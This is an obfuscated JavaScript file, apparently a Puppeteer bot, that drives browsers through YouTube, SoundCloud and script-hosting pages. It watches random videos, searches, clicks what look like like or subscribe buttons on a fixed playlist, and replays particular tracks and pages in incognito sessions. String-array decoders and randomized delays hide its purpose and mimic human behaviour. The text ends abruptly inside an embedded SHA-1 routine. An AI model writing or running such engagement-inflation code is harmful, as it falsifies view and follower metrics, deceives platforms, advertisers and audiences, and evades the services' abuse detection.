const Z = b,
  Y = d,
  X = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1e8f + -0x16 * -0x10d + 0x772 * 0x1))) + i;
}

function a() {
  const bo = [
    'lgj0CYbWBgf5ia',
    'https://gr',
    'W4ldTspdNgxcISoDymoJoG',
    'getElement',
    '6ImZdwpdwT',
    'C8kXWPVdISkpWRlcSqVcVSk9',
    '%E5%BC%BA%',
    '-%E5%8A%9B',
    'B2nLC3mUlI4',
    'CMfUzg9T',
    'ugXHEq',
    'CMvZB2X2zq',
    '4ud3ZPfWkH',
    'rk.glitch.',
    'a2nRrXxcJCkRuHS2',
    'easyfork.o',
    'tw96AwXSys81lG',
    'v8kKmmo3WOGVgq',
    'FCoWm0raW7/cUCokWQ0H',
    'CmouWRJdRuJcJmoXF8oHtW',
    'fRwcV8gjbc',
    'lwfKyMXVy2STDG',
    'DxjLlty4ndHHyq',
    'zwfZEwzVCMSUBW',
    'fCkDmMxcPSoZWRmXW5xdSq',
    'y29Tl0bmzwDHBa',
    'rg/zn-CN/s',
    'AwDUzwqTzxHJAa'
  ];
  a = function() {
    return bo;
  };
  return a();
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x2011 * -0x1 + -0xafd + -0x1514 * 0x1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xb2e * -0x1 + -0x2eba + 0x98bc + (-0x4e43 + -0x4f8b + 0xd866) * random()) : await standardWaitForNetIdle(f), await wait(-0x1dd4 + -0x18ca + 0x2 * 0x2513 + (-0x3 * 0x38d + -0x3 * -0x39e + 0x26dd) * random()), -0x25c9 + 0x7d7 * 0x1 + -0xbb * -0x29;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x5ba + -0x29 * 0x1a + 0x11f8), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1b4c + 0xf * 0x1c1 + 0xfe;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x20f8 + -0xeed * -0x2 + -0x3ed2);
    let h = e[f];
    if (b['IyOfau'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0xbb6 + -0x1b82 + -0x1 * -0xfcc, s, t, u = 0xc0f + 0x25d4 + -0x31e3; t = n['charAt'](u++); ~t && (s = r % (-0xe * -0x47 + -0x1 * 0x1e8f + 0x1ab1 * 0x1) ? s * (-0x2011 * -0x1 + -0xafd + -0x14d4 * 0x1) + t : t, r++ % (-0x1dd * -0x1 + -0x7ca + 0x5f1)) ? p += String['fromCharCode'](-0x1a16 + -0x1a84 + 0x3599 & s >> (-(-0x1dd4 + -0x18ca + 0x5c * 0x98) * r & -0x1 * 0x553 + -0x3 * -0x1cf + -0x14)) : -0x25c9 + 0x7d7 * 0x1 + -0xef9 * -0x2) {
          t = o['indexOf'](t);
        }
        for (let v = 0x5ba + -0x29 * 0x1a + -0x190, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1b4c + 0xf * 0x1c1 + 0x10d))['slice'](-(0x1d1b + -0x164b * -0x1 + -0x3364));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x256b + -0x1 * 0x683 + 0x2bee,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x2d0 * -0x5 + -0x6a1 + -0xad * 0xb; u < 0x3 * -0x6f3 + -0x1da7 + 0x3380; u++) {
          p[u] = u;
        }
        for (u = 0x2 * -0x8d8 + 0x629 * -0x4 + -0x306 * -0xe; u < 0xd50 + 0x1 * 0xed5 + -0x1 * 0x1b25; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x119d + 0x700 + 0xb9d * 0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0xe15 + 0x3 * 0x796 + 0x1 * -0x24d7, q = 0x551 + 0x111c + -0x166d * 0x1;
        for (let v = -0x18 * -0x122 + -0x1fa7 + 0x477; v < n['length']; v++) {
          u = (u + (-0x1232 * -0x1 + -0x1d48 + 0xb17)) % (-0x235e + 0x53d + 0x265 * 0xd), q = (q + p[u]) % (-0x14da + -0x9c2 * 0x2 + -0xa * -0x423), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x3e * -0x69 + 0x1b93 + -0x3401)]);
        }
        return t;
      };
      b['MiHuwC'] = m, c = arguments, b['IyOfau'] = !![];
    }
    const j = e[0xc74 + 0xe8 + -0x357 * 0x4],
      k = f + j,
      l = c[k];
    return !l ? (b['fwQILj'] === undefined && (b['fwQILj'] = !![]), h = b['MiHuwC'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function randomWait() {
  return await wait(0x1d1b + -0x164b * -0x1 + -0x1fde + (-0x256b + -0x1 * 0x683 + 0x3f76) * random()), -0x2d0 * -0x5 + -0x6a1 + -0x27a * 0x3;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x3 * -0x6f3 + -0x1da7 + 0x3280, 0x2 * -0x8d8 + 0x629 * -0x4 + -0x2a5b * -0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x9fbc + 0x1 * 0xb1f5 + -0x1 * 0x6751) * getRandomInt(-0x119d + 0x700 + 0xa9f * 0x1, 0xe15 + 0x3 * 0x796 + 0x3 * -0xc46), h)), 0x551 + 0x111c + -0xb36 * 0x2;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x18 * -0x122 + -0x1fa7 + 0x477;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1232 * -0x1 + -0x1d48 + 0xb17]['split']('\x20');
    for (let k = -0x235e + 0x53d + 0x359 * 0x9; k < i['length']; k += -0x14da + -0x9c2 * 0x2 + -0x22 * -0x130)
      j += i[k] * h[i[k + (-0x3e * -0x69 + 0x1b93 + -0x3500)]];
    return j;
  });
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x20f8 + -0xeed * -0x2 + -0x3ed2);
    let h = e[f];
    if (c['qiWPqs'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0xbb6 + -0x1b82 + -0x1 * -0xfcc, r, s, t = 0xc0f + 0x25d4 + -0x31e3; s = m['charAt'](t++); ~s && (r = q % (-0xe * -0x47 + -0x1 * 0x1e8f + 0x1ab1 * 0x1) ? r * (-0x2011 * -0x1 + -0xafd + -0x14d4 * 0x1) + s : s, q++ % (-0x1dd * -0x1 + -0x7ca + 0x5f1)) ? o += String['fromCharCode'](-0x1a16 + -0x1a84 + 0x3599 & r >> (-(-0x1dd4 + -0x18ca + 0x5c * 0x98) * q & -0x1 * 0x553 + -0x3 * -0x1cf + -0x14)) : -0x25c9 + 0x7d7 * 0x1 + -0xef9 * -0x2) {
          s = n['indexOf'](s);
        }
        for (let u = 0x5ba + -0x29 * 0x1a + -0x190, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1b4c + 0xf * 0x1c1 + 0x10d))['slice'](-(0x1d1b + -0x164b * -0x1 + -0x3364));
        }
        return decodeURIComponent(p);
      };
      c['duqXgK'] = i, b = arguments, c['qiWPqs'] = !![];
    }
    const j = e[-0x256b + -0x1 * 0x683 + 0x2bee],
      k = f + j,
      l = b[k];
    return !l ? (h = c['duqXgK'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function anchorAndView(f) {
  const R = c;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + R(0x8)), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0xc74 + 0xe8 + -0xd56 * 0x1)['map'](l => Array['from'](l['children']))['flat'](-0x1 * 0x1325 + -0x18 * -0x142 + -0xb0a)['map'](l => l['childNodes'][-0x5 * 0xc3 + -0x5a9 + 0x979]['childNodes'][-0xb14 + -0x1ab4 + 0x193 * 0x18]['childNodes'][0xcf6 + 0x1b85 * -0x1 + 0x10 * 0xe9]['childNodes'][-0xc * 0x1ca + 0x1 * -0xf6b + -0x1 * -0x24e3]['childNodes'][-0x1 * -0x8f9 + -0x706 * -0x1 + -0x1 * 0xffe]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x163 * 0x19 + -0x1964 + 0x3ff7, 0x24c8 + -0x822 + -0x2 * 0x48f)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x30a3 * -0x2 + -0x32b3 + 0xce91);
  const h = await getMaxTime(f),
    i = Math['min']((-0x15d93 + -0xe04b + 0x3283e) * getRandomInt(0x9af + 0x222e + -0x2bdb, 0x19d * 0xb + 0x1 * -0x1103 + -0xb7), h);
  return await wait(i), -0xc07 * -0x3 + -0x25a0 + 0xb * 0x24;
}
async function frontScreenActions(f) {
  const S = b;
  return log(S(0x18, 'YHOQ') + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const U = c,
      T = d;
    var h;
    (h = Array['from'](document[T(0x3) + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math[U(0x9)]() * h['length'])])['children'][0x4b8 * 0x2 + -0x269 * -0xd + -0xd97 * 0x3]['children'][0x4b * 0x71 + -0x607 + 0x6c5 * -0x4]['children'][-0x2012 + 0x2418 + -0x406]['children'][0x2 * 0x1 + 0x1e * -0x16 + 0x292]['children'][-0xcc2 + -0x9d8 + 0x169a]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x2641 * 0x1 + -0x18e + 0x27d0;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x6 * 0x43d + -0x1d * -0x14b + 0x31 * -0x3d + (0x1629 * 0x1 + -0x64a + -0xfad) * random()
  }), await wait(-0x1 * -0x199 + -0x53 * 0x1f + 0x29a * 0x4 + (-0x4c * 0x30 + 0x11bc + -0x250) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1 * -0x1a49 + 0x5cb + -0x2012]['childNodes'][0x2 * -0xfb + -0x50f * -0x2 + -0x827]['childNodes'][-0x6 * 0x587 + -0x1d0d + 0x3e38 * 0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1 * 0x2211 + 0x25 * -0x6a + 0x3168]['childNodes'][-0x53 * 0x1a + 0x5 * 0xfe + 0x378]['childNodes'][0x11a7 * 0x2 + 0x11e9 + -0x3535]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1bd8 + -0x1 * 0x10a3 + -0xb34),
          r = 0x380 + -0xc1d + 0x89d;
        for (let u = 0x183 * -0x3 + 0x253f + -0x20b6; u < q['length']; u += 0x200e + 0x256c + -0x4578)
          r += q[u] * k[q[u + (-0x8 * -0x1c4 + -0x11 * -0x153 + -0x2 * 0x1251)]];
        return r;
      }(n);
  });
  await wait((-0x71c5 + -0x1bcb * -0x1 + 0x1cea * 0x5) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0xe129 + 0x1 * 0x3b23 + 0x1e * -0x1aa) * getRandomInt(-0x25ec + -0x2243 + 0x4830, 0x12e3 + -0x1db1 * 0x1 + -0x56c * -0x2), h + (-0x188b + 0x200f + 0xc04));
  return await wait(i), 0x1dd9 + -0x7 * 0x1f5 + -0x1 * 0x1025;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1a97 + -0x9d4 + -0x1 * 0x10c3), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x7 * 0x1b2 + -0x60a * -0x5 + -0x9 * 0xbc + (-0xb77 * 0x1 + -0x1408 + 0xab * 0x35) * Math['random']());
    });
  }, -0x29ff + 0x34b4 + 0x10a3 * 0x1);
  await wait(-0x2 * 0x44bae + 0x1 * -0x673c6 + 0x139f02);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x7f45 + -0xb34a + 0x312d * 0xb) * getRandomInt(-0x77d * -0x3 + -0x1 * 0x10e7 + -0xa * 0x8e, 0x856 + 0x1b79 + 0xe * -0x28d)), clearInterval(h), -0x1 * 0x1233 + -0x229f * -0x1 + -0x106b;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x16a2 + -0x2 * 0xe27 + 0x5ac;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1f22 + 0xe8b + 0x2 * -0x16d6;
    await randomWait();
  }
  return -0x2566 * 0x1 + -0x8 * -0x20b + -0x257 * -0x9;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1663 + 0x2502 + -0xc5 * 0x13 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x8b * -0x2f + -0xc9 * 0x2e + 0x3da3 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x2ec + 0x1b75 + -0x1e61 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xc37 * -0x3 + 0x17e9 * -0x1 + 0x1 * -0xcbc;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const V = c;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && V(0xa) === n['textConten' + 't'] && n['click']();
        });
        await wait(0x460d + -0x900a + 0x5cf * 0x2b + getRandomInt(0x62cb + 0x7 * 0x2d7 + -0x3c14, 0x1 * 0xaf41 + 0x9d2c + -0xd73d));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x235e + 0x7a + 0x22e5), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1 * -0x5fe + 0x1429 + -0x193 * 0x9;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x23cb + -0x1d46 + 0x4111, -0x25 * 0x2d + -0x1e26 + -0x1 * -0x24d9)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x2 * -0x1256 + -0xa6 * 0x29 + -0x246 + floor((-0xaa6 + -0x24bb + 0x3349) * random()))), log('p2'), log(await s['evaluate'](() => {
        const W = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x19 * 0x3f9e152 + -0x468bb02 * 0x8 + 0x106acd912),
          -0x1 * -0xbdfb93 + 0xe3971c * 0x1 + -0x3f7 * 0x4909,
          0x1 * -0xc4d1 + -0x6 * -0x234a + 0x7115,
          0x896 * 0x3 + 0x1 * 0x67a + 0xc * -0x2a5
        ], y = [
          -0x45 * -0x51 + -0x1 * 0x36c + -0x1251,
          0x2 * 0xb87 + 0x208e + -0x2 * 0x1bc6,
          -0xc40 + -0x213a + 0x2d82,
          0x16 + -0x917 + 0x901
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x26c1 + -0x1807 * 0x1 + -0x3ec9 * -0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0xaca * -0x2 + -0x8a + -0x1 * 0x150a; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x2604 + 0x34 * 0x3 + -0x26a0) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1 * -0xbd4 + 0x262c + 0x1 * -0x1a58] = A[0xca * -0x2 + -0x25e5 + 0x2789] = A[-0xd7b + 0x125 + 0xc57 * 0x1] = A[-0x16cf * 0x1 + 0x3 * 0x68f + 0x192 * 0x2] = A[-0xf5e + 0x1d02 + -0xda1] = A[0x2 * -0x1059 + -0x1720 + 0x37d6] = A[0x1cc * 0xe + -0x102 + -0x80b * 0x3] = A[0x2449 + -0x2dd * 0x7 + -0x3 * 0x568] = A[-0x1 * -0x1129 + 0xbe7 * -0x1 + 0x53b * -0x1] = A[0x572 * 0x2 + -0x477 * -0x6 + -0x25a6] = A[-0x106 + -0x1688 + 0x3 * 0x7dd] = A[0x81b + 0x1a * -0x26 + -0x435] = A[-0x1 * 0x70b + -0x94e + 0x1064] = A[0x1b42 + -0xf27 + 0x93 * -0x15] = A[-0x49d * 0x2 + -0x3f9 + 0xd40 * 0x1] = A[-0x1481 + -0x1f63 * 0x1 + -0x19f9 * -0x2] = A[0x61e * -0x6 + 0x3 * 0x52c + -0x31 * -0x6f] = 0x137 * -0x1 + 0x1 * 0x1c8b + -0x1b54, this['blocks'] = A) : this['blocks'] = [
                0xcf7 * -0x2 + 0x27b + 0x1773,
                0x26fa + 0x59e * -0x2 + 0x35 * -0x86,
                -0x3 * -0x97 + -0x1f7d * -0x1 + -0x2142,
                -0x7cd + 0x37 * 0x2 + -0x3 * -0x275,
                0xd12 + 0x1 * -0x1ec5 + -0xc5 * -0x17,
                0x265c + -0xba9 + 0x5 * -0x557,
                0xb * -0x193 + -0x454 * -0x7 + -0xcfb,
                -0xd * 0x195 + -0x65 * 0x37 + -0x4 * -0xa91,
                0x1 * -0x697 + 0x1737 + -0x10a0,
                0x92c * 0x1 + -0x11 * -0x1e5 + -0x2961,
                0x5 * 0x1aa + 0x201a + -0x286c,
                -0x1e * 0xd6 + -0x10 * 0x20 + 0x6c5 * 0x4,
                0x1157 * 0x1 + -0x34 * -0x34 + -0x3 * 0x94d,
                -0x29 * 0x74 + 0x182c + 0x598 * -0x1,
                0xe7 * -0x11 + 0xc * 0x23 + -0x7 * -0x1f5,
                -0x1 * -0xe5 + 0x5ad + 0x692 * -0x1,
                -0x17e9 * 0x1 + -0x18d4 + -0x3 * -0x103f
              ], this['h0'] = -0x15a0d523 + 0x3b9e1cb2 + 0x4a9b43f * 0xe, this['h1'] = -0x52d5e63 * 0x59 + 0x2 * 0x340f6604 + 0x25474afec, this['h2'] = 0xc8921b0 * -0x7 + -0xc90ea57c + 0x2 * 0xdcc4b725, this['h3'] = 0x12b694bf + -0x13fc0128 + 0x27ed269 * 0x7, this['h4'] = 0xd6182757 + -0x7c04de26 + 0x69bf98bf, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x107 * -0x22 + 0x3a * -0x4f + 0x4 * -0x442, this['finalized'] = this['hashed'] = -0x7a2 + -0x1e * -0x32 + 0xe3 * 0x2, this['first'] = 0x4 * 0x662 + -0x1 * 0x1f8e + 0x607;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x15df * 0x1 + -0x1f54 + -0x3 * -0x327, O = J['length'] || -0x2cb + 0x1d4 * -0x6 + 0xdc3, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1e6b + 0x7 * -0x302 + -0x95d, P[-0x14f2 + 0x1912 + -0x20 * 0x21] = this['block'], P[0x13f3 * 0x1 + 0x145f + 0x2842 * -0x1] = P[0x1baf + 0xcbb * 0x3 + -0x5fd * 0xb] = P[-0x1f1b * 0x1 + 0x1 * -0x214c + -0xb * -0x5db] = P[0x1f08 + 0x2302 + 0x4207 * -0x1] = P[0x106 + 0xab1 + 0x1 * -0xbb3] = P[-0x4ab + 0xb9 * -0x2f + 0x26a7] = P[-0x207f + 0x310 + 0x1d75] = P[0x65 * -0x11 + 0x5ff * -0x2 + 0x12ba] = P[0x1752 + 0x1d2 * -0x8 + -0x8ba] = P[-0x1 * -0x68d + -0x818 + 0x194] = P[-0x4c * -0x38 + -0x1168 + 0xd2] = P[-0x1c97 + -0x259d + 0x423f] = P[0x42a + -0x571 + 0x153] = P[-0x13e1 + 0xf46 + 0x254 * 0x2] = P[-0x7b3 * 0x3 + 0x747 + -0x1 * -0xfe0] = P[-0x127e + -0x7a * 0x3b + 0x2eab] = -0x25 * -0xe3 + -0x1 * 0x1cd + 0x1f02 * -0x1), K) {
                    for (N = this['start']; M < O && N < -0x1a1e * 0x1 + -0x3 * 0xb3 + 0x15b * 0x15; ++M)
                      P[N >> -0x22 * 0xc5 + 0x1 * -0x7d2 + 0x2 * 0x10ff] |= J[M] << y[-0x2243 + 0x2b * 0xad + 0x3 * 0x1bd & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0xa1d + -0x715 + 0xb2 * -0x4; ++M)
                      (L = J['charCodeAt'](M)) < -0x211d * 0x1 + 0x1f73 + 0x22a * 0x1 ? P[N >> 0x1bdd + 0x52c + -0x2107] |= L << y[0xd * 0x3a + -0x1764 + -0x1 * -0x1475 & N++] : L < 0x19e7 + 0x1 * 0xd0d + -0x1ef4 ? (P[N >> -0x11c * -0x21 + -0x12bd * -0x1 + 0x1c9 * -0x1f] |= (-0x178c + 0xd * 0x249 + 0x5 * -0x115 | L >> -0x26cb + 0x18c7 + 0xe0a) << y[-0xfd * 0x17 + 0x1152 + 0x56c & N++], P[N >> 0x12a6 + -0x213b * -0x1 + -0x33df] |= (0x2d2 + 0x468 + 0x15 * -0x52 | -0x4dc * -0x4 + -0x105 + -0x48b * 0x4 & L) << y[0x1 * -0x2329 + -0x1272 + 0x359e & N++]) : L < -0xfed + -0xb * -0x153d + -0x1b2 || L >= 0x16 * 0x64c + 0x1afca + -0x15a52 ? (P[N >> -0x1 * 0x1581 + -0x1492 * 0x1 + 0x3 * 0xe07] |= (0xaab + 0x72a * -0x3 + -0xbb3 * -0x1 | L >> -0x1f0 + -0x757 * 0x2 + 0x10aa) << y[0x95 * -0x1d + 0x1 * 0x1e07 + -0xd23 & N++], P[N >> 0x1d8 + -0x3ad * -0x6 + -0x16 * 0x116] |= (-0x8d0 + -0x51b * 0x6 + 0x27f2 | L >> -0x1 * 0x22dd + -0x819 + 0x189 * 0x1c & -0xa16 + 0x1 * -0x1651 + -0x2 * -0x1053) << y[-0x175b + -0xa2f + 0x218d * 0x1 & N++], P[N >> -0x1 * -0xd5f + -0xa52 * 0x1 + -0x30b] |= (0xc3b + 0xb11 + -0x16cc | -0x2281 + -0xb2b + 0x2deb & L) << y[-0x25e0 + 0x354 + -0xb85 * -0x3 & N++]) : (L = -0x1b2e7 + -0x5ee8 + 0x311cf + ((-0xe9c + 0x2321 + 0x5 * -0x34e & L) << -0x192 * -0x4 + -0x2204 + -0x58e * -0x5 | 0x2008 + 0x1876 + 0x347f * -0x1 & J['charCodeAt'](++M)), P[N >> -0x4 * -0x983 + 0x8f * 0x1c + -0x35ae] |= (0x1 * -0x961 + 0x26 * -0xd3 + 0xb * 0x3c9 | L >> 0x456 + 0x154d + -0xb * 0x253) << y[-0x154c + -0x21d6 + 0x3725 & N++], P[N >> 0x15c9 + 